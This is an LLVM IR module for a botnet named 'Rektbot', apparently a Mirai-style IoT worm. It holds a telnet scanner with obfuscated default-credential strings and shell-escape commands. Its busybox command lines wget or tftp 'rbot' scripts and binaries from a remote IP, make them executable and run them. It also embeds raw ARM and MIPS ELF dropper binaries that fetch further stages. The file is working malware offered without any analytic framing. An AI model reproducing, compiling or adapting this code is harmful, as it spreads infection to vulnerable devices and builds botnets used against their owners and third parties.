; ModuleID = 'host/ir_fla/Rektbot.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.payload = type { i8, i8, i8*, i16 }
%struct.scanner_auth = type { i8*, i8*, i16, i16, i8, i8 }
%struct.__sigset_t = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.scanner_connection = type { %struct.scanner_auth*, %struct.telnet_info, i32, i32, i32, i32, i32, [8192 x i8], [16 x i8], i8, i8, i8, i8, i16, i16, i32, i32 }
%struct.telnet_info = type { i32, i32 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.binary = type { i8*, i8 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.resolv_entries = type opaque

@fd_ctrl = global i32 -1, align 4
@fd_serv = global i32 -1, align 4
@pending_connection = global i8 0, align 1
@pid1 = common global i32 0, align 4
@pid2 = common global i32 0, align 4
@maintain_thread = common global i32 0, align 4
@LOCAL_ADDR = common global i32 0, align 4
@scanner_pid = common global i32 0, align 4
@spid = common global i32 0, align 4
@mainpid = common global i32 0, align 4
@srv_addr = common global %struct.sockaddr_in zeroinitializer, align 4
@.str = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"unknown\00", align 1
@.str.2 = private unnamed_addr constant [13 x i8] c"/bin/busybox\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"\00\00\00\01\00", align 1
@ensure_single_instance.local_bind = internal global i8 1, align 1
@fake_time = global i32 0, align 4
@rsck = common global i32 0, align 4
@scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str.20 = private unnamed_addr constant [5 x i8] c"PMMV\00", align 1
@.str.21 = private unnamed_addr constant [6 x i8] c"VVLGV\00", align 1
@.str.22 = private unnamed_addr constant [9 x i8] c"\13\12\12\13AJKL\00", align 1
@.str.23 = private unnamed_addr constant [6 x i8] c"KTFGT\00", align 1
@.str.24 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.25 = private unnamed_addr constant [4 x i8] c"@KL\00", align 1
@.str.26 = private unnamed_addr constant [8 x i8] c"FGDCWNV\00", align 1
@.str.27 = private unnamed_addr constant [7 x i8] c"FCGOML\00", align 1
@.str.28 = private unnamed_addr constant [7 x i8] c"AOQ\17\12\12\00", align 1
@.str.29 = private unnamed_addr constant [8 x i8] c"pmmv\17\12\12\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"pmmv\00", align 1
@.str.31 = private unnamed_addr constant [8 x i8] c"VQNKLWZ\00", align 1
@.str.32 = private unnamed_addr constant [9 x i8] c"XQWL\13\13\1A\1A\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"rNQaJEoG\13\00", align 1
@.str.34 = private unnamed_addr constant [8 x i8] c"WREPCFG\00", align 1
@.str.35 = private unnamed_addr constant [6 x i8] c"VGNAM\00", align 1
@.str.36 = private unnamed_addr constant [5 x i8] c"\13\13\13\13\00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"\16\11\10\13\00", align 1
@.str.38 = private unnamed_addr constant [6 x i8] c"WKF\1F\12\00", align 1
@.str.39 = private unnamed_addr constant [5 x i8] c"WKF\12\00", align 1
@.str.40 = private unnamed_addr constant [7 x i8] c"Q[QVGO\00", align 1
@.str.41 = private unnamed_addr constant [11 x i8] c"VGNLGVPMMV\00", align 1
@.str.42 = private unnamed_addr constant [13 x i8] c"PMMVRCQQUMPF\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"PMMVRCQQ\00", align 1
@.str.44 = private unnamed_addr constant [11 x i8] c"VGNLGVRCQQ\00", align 1
@.str.45 = private unnamed_addr constant [15 x i8] c"VGNLGVRCQQUMPF\00", align 1
@.str.46 = private unnamed_addr constant [9 x i8] c"RCQQUMPF\00", align 1
@.str.47 = private unnamed_addr constant [5 x i8] c"RCQQ\00", align 1
@.str.48 = private unnamed_addr constant [6 x i8] c"QJGNN\00", align 1
@.str.49 = private unnamed_addr constant [14 x i8] c"VCxXb\10\11\16\1B\17\1A\17\1B\00", align 1
@.str.50 = private unnamed_addr constant [10 x i8] c"VQEMKLEML\00", align 1
@.str.51 = private unnamed_addr constant [10 x i8] c"QWRGPWQGP\00", align 1
@.str.52 = private unnamed_addr constant [11 x i8] c"NKLWZQJGNN\00", align 1
@.str.53 = private unnamed_addr constant [15 x i8] c"V\12VCNA\12LVP\12N\16\03\00", align 1
@.str.54 = private unnamed_addr constant [6 x i8] c"EWGQV\00", align 1
@.str.55 = private unnamed_addr constant [7 x i8] c"\13\10\11\16\17\14\00", align 1
@.str.56 = private unnamed_addr constant [6 x i8] c"\13\10\11\16\17\00", align 1
@.str.57 = private unnamed_addr constant [5 x i8] c"WQGP\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"CFOKL\00", align 1
@.str.59 = private unnamed_addr constant [7 x i8] c"FGTKAG\00", align 1
@.str.60 = private unnamed_addr constant [5 x i8] c"\13\10\11\16\00", align 1
@.str.61 = private unnamed_addr constant [11 x i8] c"\13\10\11\16\17\14\15\1A\1B\12\00", align 1
@.str.62 = private unnamed_addr constant [7 x i8] c"\13\13\13\13\13\13\00", align 1
@.str.63 = private unnamed_addr constant [5 x i8] c"\13\1B\1A\1A\00", align 1
@.str.64 = private unnamed_addr constant [6 x i8] c"\10\10\10\10\10\00", align 1
@.str.65 = private unnamed_addr constant [14 x i8] c"cFOKLKQVPCVMP\00", align 1
@.str.66 = private unnamed_addr constant [14 x i8] c"CFOKLKQVPCVMP\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"cFOKL\00", align 1
@.str.68 = private unnamed_addr constant [4 x i8] c"CFO\00", align 1
@.str.69 = private unnamed_addr constant [13 x i8] c"\15WHoIM\12CFOKL\00", align 1
@.str.70 = private unnamed_addr constant [9 x i8] c"QOACFOKL\00", align 1
@.str.71 = private unnamed_addr constant [10 x i8] c"CFOKL\13\10\11\16\00", align 1
@.str.72 = private unnamed_addr constant [9 x i8] c"CFOKL\13\10\11\00", align 1
@.str.73 = private unnamed_addr constant [7 x i8] c"C@A\13\10\11\00", align 1
@.str.74 = private unnamed_addr constant [9 x i8] c"ACV\13\12\10\1B\22\00", align 1
@.str.75 = private unnamed_addr constant [4 x i8] c"\17WR\00", align 1
@.str.76 = private unnamed_addr constant [6 x i8] c"\03PMMV\00", align 1
@.str.77 = private unnamed_addr constant [2 x i8] c"\13\00", align 1
@.str.78 = private unnamed_addr constant [3 x i8] c"\13\10\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"CLVQNS\00", align 1
@.str.80 = private unnamed_addr constant [9 x i8] c"\13\10\11\16\17\14\15\1A\00", align 1
@.str.81 = private unnamed_addr constant [7 x i8] c"\12\12\12\12\12\12\00", align 1
@.str.82 = private unnamed_addr constant [9 x i8] c"\12\12\12\12\12\12\12\12\00", align 1
@.str.83 = private unnamed_addr constant [9 x i8] c"\13\10\11\16SUGP\00", align 1
@.str.84 = private unnamed_addr constant [9 x i8] c"CLLK\10\12\13\11\00", align 1
@.str.85 = private unnamed_addr constant [6 x i8] c"\17\16\11\10\13\00", align 1
@.str.86 = private unnamed_addr constant [7 x i8] c"XNZZ\0C\22\00", align 1
@.str.87 = private unnamed_addr constant [6 x i8] c"HT@XF\00", align 1
@.str.88 = private unnamed_addr constant [5 x i8] c"CLIM\00", align 1
@.str.89 = private unnamed_addr constant [8 x i8] c"ZOJFKRA\00", align 1
@.str.90 = private unnamed_addr constant [7 x i8] c"ZA\11\17\13\13\00", align 1
@.str.91 = private unnamed_addr constant [6 x i8] c"TKXZT\00", align 1
@.str.92 = private unnamed_addr constant [8 x i8] c"CLVQNS\22\00", align 1
@.str.93 = private unnamed_addr constant [9 x i8] c"HWCLVGAJ\00", align 1
@.str.94 = private unnamed_addr constant [8 x i8] c"eo\1A\13\1A\10\22\00", align 1
@.str.95 = private unnamed_addr constant [7 x i8] c"\1A\1A\1A\1A\1A\1A\00", align 1
@.str.96 = private unnamed_addr constant [7 x i8] c"\14\14\14\14\14\14\00", align 1
@.str.97 = private unnamed_addr constant [9 x i8] c"JWLV\17\15\17\1B\00", align 1
@.str.98 = private unnamed_addr constant [11 x i8] c"QWRGPTKQMP\00", align 1
@.str.99 = private unnamed_addr constant [9 x i8] c"X[CF\13\10\11\16\00", align 1
@.str.100 = private unnamed_addr constant [7 x i8] c"OE\11\17\12\12\00", align 1
@.str.101 = private unnamed_addr constant [7 x i8] c"OGPNKL\00", align 1
@.str.102 = private unnamed_addr constant [8 x i8] c"QWRRMPV\00", align 1
@.str.103 = private unnamed_addr constant [7 x i8] c"VGNLGV\00", align 1
@.str.104 = private unnamed_addr constant [9 x i8] c"MRGPCVMP\00", align 1
@.str.105 = private unnamed_addr constant [37 x i8] c"enable\0D\0Asystem\0D\0Ashell\0D\0Ash\0D\0Aping ; sh\00", align 1
@.str.106 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.107 = private unnamed_addr constant [141 x i8] c"/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1\00", align 1
@.str.108 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.109 = private unnamed_addr constant [5 x i8] c"arm4\00", align 1
@.str.110 = private unnamed_addr constant [142 x i8] c"/bin/busybox cat /proc/cpuinfo || while read i; do /bin/busybox echo $i; done < /proc/cpuinfo || /bin/busybox dd if=/proc/cpuinfo count=1; %s\00", align 1
@tmp_dirs = global [15 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1.5, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3.7, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4.8, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0)], align 16
@.str.111 = private unnamed_addr constant [18 x i8] c">%s.file && cd %s\00", align 1
@.str.112 = private unnamed_addr constant [32 x i8] c"/bin/busybox rm -rf .file %s %s\00", align 1
@.str.113 = private unnamed_addr constant [13 x i8] c".rbot.binary\00", align 1
@.str.114 = private unnamed_addr constant [14 x i8] c".rbot.dropper\00", align 1
@.str.115 = private unnamed_addr constant [98 x i8] c"/bin/busybox cp /bin/busybox .rbot.binary; >.rbot.binary; /bin/busybox chmod 777 .rbot.binary; %s\00", align 1
@.str.116 = private unnamed_addr constant [8 x i8] c"unknown\00", align 1
@.str.117 = private unnamed_addr constant [142 x i8] c"/bin/busybox wget http://%d.%d.%d.%d/rbot.sh -O- >.rbot.shell; /bin/busybox tftp -g -l .rbot.shell -r rbot.sh %d.%d.%d.%d; sh .rbot.shell; %s\00", align 1
@.str.118 = private unnamed_addr constant [41 x i8] c"/bin/busybox wget; /bin/busybox tftp; %s\00", align 1
@.str.119 = private unnamed_addr constant [101 x i8] c"/bin/busybox cp /bin/busybox .rbot.dropper; >.rbot.dropper; /bin/busybox chmod 777 .rbot.dropper; %s\00", align 1
@.str.120 = private unnamed_addr constant [125 x i8] c"/bin/busybox wget http://%d.%d.%d.%d/rbot.%s -O- >.rbot.binary; /bin/busybox chmod 777 .rbot.binary;./.rbot.binarys wget; %s\00", align 1
@.str.121 = private unnamed_addr constant [121 x i8] c"/bin/busybox tftp -g -l .rbot.binary -r rbot.%s %d.%d.%d.%d; /bin/busybox chmod 777 .rbot.binary;./.rbot.binary tftp; %s\00", align 1
@.str.123 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.124 = private unnamed_addr constant [3 x i8] c">>\00", align 1
@.str.125 = private unnamed_addr constant [36 x i8] c"./.rbot.dropper;./.rbot.binary echo\00", align 1
@.str.126 = private unnamed_addr constant [24 x i8] c"chmod 777 .rbot.dropper\00", align 1
@.str.122 = private unnamed_addr constant [50 x i8] c"/bin/busybox echo -en '%s' %s .rbot.dropper;%s;%s\00", align 1
@.str.150 = private unnamed_addr constant [21 x i8] c"ead-only file system\00", align 1
@.str.151 = private unnamed_addr constant [17 x i8] c"ermission denied\00", align 1
@.str.130 = private unnamed_addr constant [7 x i8] c"\5Cx%02x\00", align 1
@payloads = global [4 x %struct.payload] [%struct.payload { i8 1, i8 40, i8* getelementptr inbounds ([1081 x i8], [1081 x i8]* @.str.16, i32 0, i32 0), i16 1080 }, %struct.payload { i8 1, i8 41, i8* getelementptr inbounds ([1337 x i8], [1337 x i8]* @.str.17, i32 0, i32 0), i16 1336 }, %struct.payload { i8 2, i8 8, i8* getelementptr inbounds ([1889 x i8], [1889 x i8]* @.str.18, i32 0, i32 0), i16 1888 }, %struct.payload { i8 1, i8 8, i8* getelementptr inbounds ([1921 x i8], [1921 x i8]* @.str.19, i32 0, i32 0), i16 1920 }], align 16
@.str.16 = private unnamed_addr constant [1081 x i8] c"\7FELF\01\01\01a\00\00\00\00\00\00\00\00\02\00(\00\01\00\00\00\DC\82\00\004\00\00\00p\03\00\00\02\02\00\004\00 \00\02\00(\00\05\00\04\00\01\00\00\00\00\00\00\00\00\80\00\00\00\80\00\00P\03\00\00P\03\00\00\05\00\00\00\00\80\00\00\01\00\00\00P\03\00\00P\03\01\00P\03\01\00\00\00\00\00\08\00\00\00\06\00\00\00\00\80\00\00\01\18\A0\E1\FF\18\01\E2\00\1C\81\E1\FF0\03\E2\02$\A0\E1\03\10\81\E1\FF,\02\E2\01 \82\E1\FF<\02\E2\FF\08\02\E2\034\A0\E1 \04\A0\E1\22\0C\80\E1\02<\83\E1\00\00\83\E1\0E\F0\A0\E1\00\10\A0\E1\00\00\9F\E5\87\00\00\EA\01\00\90\00\00\10\A0\E1\00\00\9F\E5\83\00\00\EA\06\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1|\00\00\EA\05\00\90\00\04\E0-\E5\0C\D0M\E2\07\00\8D\E8\03\10\A0\E3\0D \A0\E1\08\00\9F\E5t\00\00\EB\0C\D0\8D\E2\00\80\BD\E8f\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1k\00\00\EA\04\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1d\00\00\EA\03\00\90\00\04\E0-\E5\0C\D0M\E2\07\00\8D\E8\01\10\A0\E3\0D \A0\E1\08\00\9F\E5\5C\00\00\EB\0C\D0\8D\E2\00\80\BD\E8f\00\90\00\F0A-\E9@\E1\9F\E5\94\D0M\E2\00\00\00\EA\01\E0\8E\E2\00`\DE\E5\00\00V\E3\FB\FF\FF\1A$\C1\9F\E5\D00\A0\E3\0E\80l\E0\02@\A0\E3P\C0\A0\E3k\10\A0\E3\85 \A0\E3\B0\00\A0\E3\83\C0\CD\E5\80@\CD\E5\81`\CD\E5\82`\CD\E5\A9\FF\FF\EB\F4\10\9F\E5\84\00\8D\E5\F0 \9F\E5\F0\00\9F\E5\BC\FF\FF\EB\01\10\A0\E3\00p\A0\E1\06 \A0\E1\04\00\A0\E1\D6\FF\FF\EB\01\00p\E3\01\00w\13\00P\A0\E1\01\00\A0\03\AA\FF\FF\0B\05\00\A0\E1\80\10\8D\E2\10 \A0\E3\B5\FF\FF\EB\00\00P\E3\00\00`\B2\A3\FF\FF\BB\17@\88\E2\05\00\A0\E1\A0\10\9F\E5\04 \A0\E1\B7\FF\FF\EB\04\00P\E1\03\00\A0\13\9B\FF\FF\1B\06@\A0\E1\93\10\8D\E2\01 \A0\E3\05\00\A0\E1\B6\FF\FF\EB\01\00P\E3\04\00\A0\E3\93\FF\FF\1B\930\DD\E5\04D\83\E1d0\9F\E5\03\00T\E1\F3\FF\FF\1A\0D\10\A0\E1\80 \A0\E3\05\00\A0\E1\AA\FF\FF\EB\00 P\E2\0D@\A0\E1\0D\10\A0\E1\07\00\A0\E1\01\00\00\DA\9D\FF\FF\EB\F4\FF\FF\EA\05\00\A0\E1\85\FF\FF\EB\07\00\A0\E1\83\FF\FF\EB\05\00\A0\E3}\FF\FF\EB\94\D0\8D\E2\F0\81\BD\E8\1C\83\00\00A\02\00\00\FF\01\00\00$\83\00\004\83\00\00\0A\0D\0A\0D\A5\FF\FF\EAp@-\E9\10@\8D\E2p\00\94\E8q\00\90\EF\01\0Ap\E3\00@\A0\E1p\80\BD\98\03\00\00\EB\000d\E2\000\80\E5\00\00\E0\E3p\80\BD\E8\00\00\9F\E5\0E\F0\A0\E1P\03\01\00arm4\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.arm4 HTTP/1.0\0D\0A\0D\0A\00\00.shstrtab\00.text\00.rodata\00.bss\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00t\80\00\00t\00\00\00\A8\02\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\1C\83\00\00\1C\03\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\00\00\00P\03\01\00P\03\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00P\03\00\00\1E\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@.str.17 = private unnamed_addr constant [1337 x i8] c"\7FELF\01\01\01\00\00\00\00\00\00\00\00\00\02\00(\00\01\00\00\00l\83\00\004\00\00\00H\04\00\00\02\00\00\044\00 \00\04\00(\00\06\00\05\00\01\00\00\00\00\00\00\00\00\80\00\00\00\80\00\00\14\04\00\00\14\04\00\00\05\00\00\00\00\80\00\00\01\00\00\00\14\04\00\00\14\04\01\00\14\04\01\00\10\00\00\00\10\00\00\00\06\00\00\00\00\80\00\00\07\00\00\00\14\04\00\00\14\04\01\00\14\04\01\00\00\00\00\00\08\00\00\00\04\00\00\00\04\00\00\00Q\E5td\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\018\83\E1\00<\83\E1\024\83\E1\03\0C\A0\E1\02\08\80\E1\FF(\03\E2\22\04\80\E1#\0C\80\E1\1E\FF/\E1\04\E0-\E5\00\10\A0\E1\04\D0M\E2\01\00\A0\E3\9D\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\00\10\A0\E1\04\D0M\E2\06\00\A0\E3\95\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\05\00\A0\E3\8A\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\0C\00\9F\E5\7F\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\1B\01\00\00\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\04\00\A0\E3s\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\03\00\A0\E3h\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\0C\00\9F\E5]\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\19\01\00\00\F0A-\E9@1\9F\E5\98\D0M\E2\00@\A0\E3\00\00\00\EA\01@\84\E2\01`S\E5\00\00V\E3\010\83\E2\FA\FF\FF\1A\02\C0\A0\E3\D00\A0\E3k\10\A0\E3\85 \A0\E3\B4\C8\CD\E1\B0\00\A0\E3\05\CA\A0\E3\B6\C8\CD\E1\9A\FF\FF\EB\FC\10\9F\E5\88\00\8D\E5\F8 \9F\E5\F8\00\9F\E5\AE\FF\FF\EB\01\10\A0\E3\00p\A0\E1\06 \A0\E1\02\00\A0\E3\D6\FF\FF\EB\01\00p\E3\01\00w\13\00P\A0\E1\01\00\A0\03\94\FF\FF\0B\05\00\A0\E1\84\10\8D\E2\10 \A0\E3\AB\FF\FF\EB\00\00P\E3\00\00`\B2\8D\FF\FF\BB\17@\84\E2\05\00\A0\E1\A8\10\9F\E5\04 \A0\E1\AF\FF\FF\EB\04\00P\E1\03\00\A0\13\85\FF\FF\1B\94\80\9F\E5\06@\A0\E1\97`\8D\E2\06\10\A0\E1\01 \A0\E3\05\00\A0\E1\B0\FF\FF\EB\01\00P\E3\04\00\A0\E3{\FF\FF\1B\970\DD\E5\04D\83\E1\08\00T\E1\F4\FF\FF\1A\04@\8D\E2\04\10\A0\E1\80 \A0\E3\05\00\A0\E1\A4\FF\FF\EB\00 P\E2\04\10\A0\E1\07\00\A0\E1\01\00\00\DA\94\FF\FF\EB\F5\FF\FF\EA\05\00\A0\E1r\FF\FF\EB\07\00\A0\E1p\FF\FF\EB\05\00\A0\E3f\FF\FF\EB\98\D0\8D\E2\F0A\BD\E8\1E\FF/\E1\E1\83\00\00A\02\00\00\FF\01\00\00\E8\83\00\00\F8\83\00\00\0A\0D\0A\0D\A5\FF\FF\EA\0D\C0\A0\E1\F0\00-\E9\00p\A0\E1\01\00\A0\E1\02\10\A0\E1\03 \A0\E1x\00\9C\E8\00\00\00\EF\F0\00\BD\E8\01\0Ap\E3\0E\F0\A01\FF\FF\FF\EA\04\E0-\E5\1C \9F\E5\000\A0\E1\02 \9F\E7\06\00\00\EB\000c\E2\020\80\E7\00\00\E0\E3\04\E0\9D\E4\1E\FF/\E1l\80\00\00\00\00\00\00\0F\0A\E0\E3\1F\F0@\E2\00\00\A0\E1\00\00\A0\E1arm7\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.arm7 HTTP/1.0\0D\0A\0D\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\08\00\00\00\00.shstrtab\00.text\00.rodata\00.tbss\00.got\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00\C0\80\00\00\C0\00\00\00 \03\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\E0\83\00\00\E0\03\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\04\00\00\14\04\01\00\14\04\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\1F\00\00\00\01\00\00\00\03\00\00\00\14\04\01\00\14\04\00\00\10\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\04\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00$\04\00\00$\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@.str.18 = private unnamed_addr constant [1889 x i8] c"\7FELF\01\02\01\00\00\00\00\00\00\00\00\00\00\02\00\08\00\00\00\01\00@\04`\00\00\004\00\00\06H\00\00\10\07\004\00 \00\03\00(\00\07\00\06\00\00\00\01\00\00\00\00\00@\00\00\00@\00\00\00\00\05\B4\00\00\05\B4\00\00\00\05\00\01\00\00\00\00\00\01\00\00\05\C0\00D\05\C0\00D\05\C0\00\00\00T\00\00\00p\00\00\00\06\00\01\00\00dt\E5Q\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\000\A5\00\FF\00\05,\00\00\04&\00\00\85 %0\C2\00\FF0\E7\00\FF\00\87 %\00\02\12\00\03\E0\00\08\00D\10%<\1C\00\05'\9C\84\E8\03\99\E0!\8F\99\80\5C\00\80(!\03 \00\08$\04\0F\A1<\1C\00\05'\9C\84\CC\03\99\E0!\8F\99\80\5C\00\80(!\03 \00\08$\04\0F\A6<\1C\00\05'\9C\84\B0\03\99\E0!\00\A0\10!\8F\99\80\5C\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A5<\1C\00\05'\9C\84\88\03\99\E0!'\BD\FF\D0\AF\BF\00(\AF\BC\00\10\8F\99\80\5C\AF\A4\00\18\AF\A5\00\1C\AF\A6\00 $\04\10\06'\A6\00\18\03 \F8\09$\05\00\03\8F\BC\00\10\8F\BF\00(\00\00\00\00\03\E0\00\08'\BD\000<\1C\00\05'\9C\84<\03\99\E0!\00\A0\10!\8F\99\80\5C\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A4<\1C\00\05'\9C\84\14\03\99\E0!\00\A0\10!\8F\99\80\5C\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A3<\1C\00\05'\9C\83\EC\03\99\E0!'\BD\FF\D0\AF\BF\00(\AF\BC\00\10\8F\99\80\5C\AF\A4\00\18\AF\A5\00\1C\AF\A6\00 $\04\10\06'\A6\00\18\03 \F8\09$\05\00\01\8F\BC\00\10\8F\BF\00(\00\00\00\00\03\E0\00\08'\BD\000<\1C\00\05'\9C\83\A0\03\99\E0!'\BD\FF@\AF\BF\00\BC\AF\B2\00\B8\AF\B1\00\B4\AF\B0\00\B0\AF\BC\00\10\8F\82\80\18\00\00\00\00$P\05\80\82\02\00\00\00\00\00\00\14@\FF\FD&\10\00\01&\10\FF\FF$\02\00\02\A7\A2\00\1C$\02\00P\A7\A2\00\1E\8F\82\80\18\8F\99\80L$\07\00\D0$\04\00\B0$\05\00k$\06\00\85$B\05\80\03 \F8\09\02\02\80#\8F\BC\00\10$\05\03\01\8F\84\80\18\8F\99\80`$\84\05\88$\06\01\FF\03 \F8\09\AF\A2\00 \8F\BC\00\10$\04\00\02\8F\99\80P$\05\00\02\00\000!\03 \F8\09\00@\90!\00@\88!$\02\FF\FF\8F\BC\00\10\12\22\00\03\00\00\00\00\16B\00\07\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\01\8F\BC\00\10\00\00\00\00\8F\99\80D\02  !'\A5\00\1C\03 \F8\09$\06\00\10\8F\BC\00\10\04A\00\07\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09\00\02 #\8F\BC\00\10\00\00\00\00\8F\85\80\18\8F\99\80H&\10\00\17$\A5\05\98\02  !\03 \F8\09\02\000!\8F\BC\00\10\10P\00\07\00\00\80!\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\03\8F\BC\00\10\00\00\80!\8F\99\808\02  !'\A5\00\18\03 \F8\09$\06\00\01\8F\BC\00\10$\03\00\01\8F\99\80T\10C\00\04$\04\00\04\03 \F8\09\00\00\00\00\8F\BC\00\10\83\A3\00\18\00\10\12\00\00C\80%<\02\0D\0A4B\0D\0A\16\02\FF\ED\00\00\00\00\8F\99\808'\B0\00,\02  !\02\00(!\03 \F8\09$\06\00\80\8F\BC\00\10\02\00(!\8F\99\80H\00@0!\18@\00\06\02@ !\03 \F8\09\00\00\00\00\8F\BC\00\10\10\00\FF\F0\00\00\00\00\8F\99\80X\00\00\00\00\03 \F8\09\02  !\8F\BC\00\10\00\00\00\00\8F\99\80X\00\00\00\00\03 \F8\09\02@ !\8F\BC\00\10\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\05\8F\BC\00\10\8F\BF\00\BC\8F\B2\00\B8\8F\B1\00\B4\8F\B0\00\B0\03\E0\00\08'\BD\00\C0<\1C\00\05'\9C\81P\03\99\E0!\03\E0\00!\04\11\00\01\00\00\00\00<\1C\00\05'\9C\818\03\9F\E0!\00\00\F8!\8F\99\80<\00\00\00\00\03 \00\08\00\00\00\00\00\00\00\00\00\00\00\00<\1C\00\05'\9C\81\10\03\99\E0!\00\80\10!\00\A0 !\00\C0(!\00\E00!\8F\A7\00\10\8F\A8\00\14\8F\A9\00\18\8F\AA\00\1C'\BD\FF\E0\AF\A8\00\10\AF\A9\00\14\AF\AA\00\18\AF\A2\00\1C\8F\A2\00\1C\00\00\00\0C\14\E0\00\03'\BD\00 \03\E0\00\08\00\00\00\00\00@ 